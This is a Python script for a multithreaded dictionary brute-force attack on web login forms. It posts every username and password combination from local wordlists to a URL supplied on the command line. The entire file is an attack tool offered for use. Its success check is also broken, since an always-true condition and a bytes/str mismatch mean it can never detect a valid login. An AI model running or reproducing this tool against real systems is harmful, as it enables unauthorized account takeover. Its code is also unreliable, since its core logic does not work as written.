import sys
import urllib.request
import urllib.error
import urllib.parse
import os
from threading import Thread
from queue import Queue

class BruteForcer:
    def __init__(self):
        self.args = sys.argv[1:]
        self.url = None
        self.path_passwords = None
        self.path_usernames = None
        self.passwords = None
        self.usernames = None
        self.queue = Queue()

        for i, arg in enumerate(self.args):
            if(arg == '-url' or arg == '--url'):
                self.url = self.args[i+1]
            elif(arg == '-expt' or arg == '--exploit-type'):
                self.exploit_type = self.args[i+1]
            elif(arg == '-u' or arg == '--usernames'):
                self.path_usernames = self.args[i+1]
            elif(arg == '-p' or arg == '--passwords'):
                self.path_passwords = self.args[i+1]
            elif(arg == '-h' or arg == '--help'):
                print(
                    "\n\nBruteForcer V0.0.1\n"+
                    "[ --url ] = IP address of the client you would inject\n"+
                    "[ --help || -h ] = Show this bro.\n"+
                    "[ --usernames || -u ] = Local path where usernames are stored.\n"+
                    "[ --passwords || -p ] = Local path where passwords are stored.\n"
                )
        if(self.url==None or self.path_usernames == None or self.path_passwords == None):
            raise ValueError("Mismatching expected values from parameters.")
        
        self.load_dictionary()
        self.load_queue()


    def load_dictionary(self):
        path = os.path.dirname(os.path.abspath(__file__))+"\\"
        self.passwords = open(path+self.path_passwords, 'r').readlines()
        self.usernames = open(path+self.path_usernames, 'r').readlines()

    def load_queue(self):
        for username in self.usernames:
            for password in self.passwords:
                self.queue.put((username, password))

    def force_login(self, username, password):
        print("----------------------------------------------------------\n"+"\rusername: "+username+"\rpassword: "+password+"\r")
        try:
            body = urllib.parse.urlencode({"username":username, "password":password}).encode('ascii')
            req = urllib.request.Request(url=self.url, data=body, method='POST')
            with urllib.request.urlopen(req) as response:
                if 'Invalid username' or 'Invalid password' in response.read():
                    print("Login Failed....")
                else: 
                    print("==============Login SUCCESSFULL==============")
                    exit()
        except urllib.error.HTTPError as Error:
            print(Error)   
            print(Error.info())
            print(Error.read())   
    
    def worker(self):
        while self.queue.qsize() > 0:
            username, password = self.queue.get()
            username, password = username.strip(), password.strip()
            self.force_login(username, password)


bruteforce = BruteForcer()

for x in range(5):
    t = Thread(target=bruteforce.worker).start()